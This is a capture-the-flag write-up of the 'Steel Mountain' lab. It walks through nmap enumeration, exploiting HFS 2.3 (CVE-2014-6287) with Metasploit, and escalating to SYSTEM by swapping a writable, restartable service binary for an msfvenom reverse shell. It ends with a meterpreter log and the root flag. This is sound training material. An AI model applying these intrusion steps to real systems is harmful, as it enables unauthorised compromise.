![image](https://user-images.githubusercontent.com/99112106/174289072-abb53ca8-4cc8-4410-9342-491cea2665eb.png)

# Steel Mountain

## 1.Enumeration 

Let's start with a simple nmap scan:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 10:15 CEST
Nmap scan report for 10.10.187.60
Host is up (0.036s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2022-04-08T08:16:53+00:00
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2022-04-07T08:06:09
|_Not valid after:  2022-10-07T08:06:09
|_ssl-date: 2022-04-08T08:16:58+00:00; 0s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:a6:5c:9d:b1:7f (unknown)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-08T08:16:53
|_  start_date: 2022-04-08T08:06:02
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.45 seconds
```

Okay, we have a bunch of opened ports... We have apache. netbios, smb, RDP (xd) and an HTTP File Server.

* * *
## 2.Exploring the website

Let's see what we encounter:

![image](https://user-images.githubusercontent.com/99112106/174289090-c1945627-5189-46fa-8250-e5a3724ae279.png)

The only interesting thing we found there is an username, "Bill Harper", the employee of the month:

![image](https://user-images.githubusercontent.com/99112106/174289103-1c55076d-3c83-4cac-84c2-775257556848.png)

Gobuster didn't get anything interesting either:

```
gobuster dir -w /usr/share/dirb/wordlists/big.txt -u http://10.10.187.60 -q
/img                  (Status: 301) [Size: 147] [--> http://10.10.187.60/img/]

```

* * *
## 3.Exploring HFS

Our nmap run discovered a HFS (HTTP File Server) running on 8080 port. Let's have a look at it:

![image](https://user-images.githubusercontent.com/99112106/174289118-051b2fe7-f74f-4f27-8e8b-b51328849c52.png)

Nmap gave us the version (2.3) so let's check if there are any known vulnerabilty for this in Metasploit:

![image](https://user-images.githubusercontent.com/99112106/174289132-8f994c18-fa5c-452d-a1dd-e5a26bdf5824.png)

Yes, we have 2 avaiable exploits, nice. Researching around more about possible vulnerabilities I discovered that the HTTP File Server is vulnerable to CVE-2014-6287:

![image](https://user-images.githubusercontent.com/99112106/174289150-a9362773-5cd1-47e6-9845-c92c12aeae11.png)

The vulnerabilty allows the threat actor to execute arbitrary programas via a %00 squence in a search action. So now, let's set up our exploit:

![image](https://user-images.githubusercontent.com/99112106/174289163-740e4e42-b7b1-4af5-b8b5-8f24cf4f4855.png)

And run it!

![image](https://user-images.githubusercontent.com/99112106/174289181-dbec89ee-fc6c-4be9-be6a-2eb8f28c18bc.png)

We have finally managed to have a opened session with meterpreter! Inside Bill's Desktop we can find the first flag:

![image](https://user-images.githubusercontent.com/99112106/174289197-7a7ff68a-563b-499b-a3c0-239831dc3deb.png)
* * *
## 4. Privileges Escalation

In order to continue or way to root, let's upload into our vulnerable machine a Powershell script that will find for possible attack vectors:

![image](https://user-images.githubusercontent.com/99112106/174289233-1954ce75-a182-4a0e-9e21-3494fab94d6f.png)

Upload the powershell module and execute the powershell script:

![image](https://user-images.githubusercontent.com/99112106/174289244-1d91f8d0-0443-4a9f-8877-9221faa71c3e.png)

If we look closely we can see:

![image](https://user-images.githubusercontent.com/99112106/174289255-0520aff8-836c-45ed-aed5-554b1af57f77.png)

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Let's use msfvenom to generate a reverse shell as an Windows executable. We'll use Shikata Ga Nai as encoder:

![image](https://user-images.githubusercontent.com/99112106/174289267-5acd3da2-e2e5-4336-b2a2-e9d682d9b5a1.png)

Now that we have our encoded reverse shell, let's upload it but first, change directory to where the vulnerable service is stored:

![image](https://user-images.githubusercontent.com/99112106/174289287-285e0de2-35c6-4751-9e97-636a88146f43.png)

Now we upload it:

![image](https://user-images.githubusercontent.com/99112106/174289296-0afc044b-58ff-4c81-a4b1-e5e025bfddfd.png)

One we uploaded it, we're going to set up our multi/handler where we'll recieve the root shell:

![image](https://user-images.githubusercontent.com/99112106/174289313-c580dcc6-5269-4de0-bfe8-e14929afbbcc.png)

Back to our previous session, we're going to restart the service:

![image](https://user-images.githubusercontent.com/99112106/174289339-1ce0dd16-09a0-4d86-a980-d2180ce56442.png)

From here you have about 30 seconds to execute all the commands (background the current session, connect to the elevated new session, and get the flag). After this delay, the elevated session is closed, the handler is stopped and you’ll need to kill your session, restart the handler, reconnect to the initial session, get a shell, and restart the service. I had to do it a couple of times before I could complete all the commands and get the flag.

```
^Z
Background channel 6? [y/N]  y
meterpreter > background 
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN   10.8.50.72:4444 -> 10.10.160.32:59836 (10.10.160.32)
  6         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ STEELMOUNTAIN  10.8.50.72:4443 -> 10.10.160.32:59883 (10.10.160.32)

msf5 exploit(multi/handler) > sessions 8
[*] Starting interaction with 8...

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > cd c:/users/administrator/desktop
meterpreter > cat root.txt
9af5f314f57607c00fd09803a587db80
meterpreter > 
meterpreter > 
[*] 10.10.160.32 - Meterpreter session 8 closed.  Reason: Died
```
